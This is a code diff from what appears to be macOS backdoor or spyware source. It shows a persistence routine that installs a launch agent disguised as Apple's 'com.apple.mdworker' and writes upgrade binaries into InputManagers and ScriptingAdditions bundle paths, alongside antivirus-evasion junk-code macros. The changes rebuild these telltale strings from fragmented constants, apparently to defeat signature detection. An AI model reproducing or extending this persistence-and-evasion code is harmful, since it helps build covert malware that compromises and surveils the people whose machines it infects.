@@ -394,9 +394,7 @@
           // Once the backdoor has been written, edit the backdoor Loader in order to
           // load the new updated backdoor upon reboot/login
           //
-          NSString *backdoorLaunchAgent = [[NSString alloc] initWithFormat: @"%@/%@",
-                                           NSHomeDirectory(),
-                                           BACKDOOR_DAEMON_PLIST];
+          NSString *backdoorLaunchAgent = createLaunchdPlistPath();
           
           // AV evasion: only on release build
           AV_GARBAGE_007
@@ -413,7 +411,12 @@
           // AV evasion: only on release build
           AV_GARBAGE_008
           
-          success = [gUtil createLaunchAgentPlist: @"com.apple.mdworker"
+          NSString *backdoorDaemonName = [NSString stringWithFormat:@"%@.%@.%@", 
+                                          DOMAIN_COM, 
+                                          DOMAIN_APL, 
+                                          LAUNCHD_NAME];
+          
+          success = [gUtil createLaunchAgentPlist: backdoorDaemonName
                                         forBinary: gBackdoorUpdateName];
           
           // AV evasion: only on release build
@@ -452,10 +455,9 @@
               AV_GARBAGE_003
             
               _upgradePath = [[NSString alloc] initWithFormat:
-                @"/Library/InputManagers/%@/%@.bundle/Contents/MacOS/%@",
-                EXT_BUNDLE_FOLDER,
-                EXT_BUNDLE_FOLDER,
-                gInputManagerName];
+                              @"/%@/%@/%@/%@.%@/%@/%@/%@", 
+                              LIBRARY_NSSTRING, IM_FOLDER, IM_NAME, IM_NAME, IM_EXT, IM_CONTENTS, IM_MACOS,
+                              gInputManagerName];
               
               // AV evasion: only on release build
               AV_GARBAGE_001
@@ -489,10 +491,13 @@
               // AV evasion: only on release build
               AV_GARBAGE_002
             
-              _upgradePath = [[NSString alloc] initWithFormat:
-                @"/Library/ScriptingAdditions/%@/Contents/MacOS/%@", 
-                EXT_BUNDLE_FOLDER,
-                gInputManagerName];
+              _upgradePath = [[NSString alloc] initWithFormat:@"/%@/%@/%@/%@/%@/%@", 
+                              LIBRARY_NSSTRING, 
+                              OSAX_FOLDER, 
+                              OSAX_NAME, 
+                              IM_CONTENTS, 
+                              IM_MACOS, 
+                              gInputManagerName];
             
               // AV evasion: only on release build
               AV_GARBAGE_001
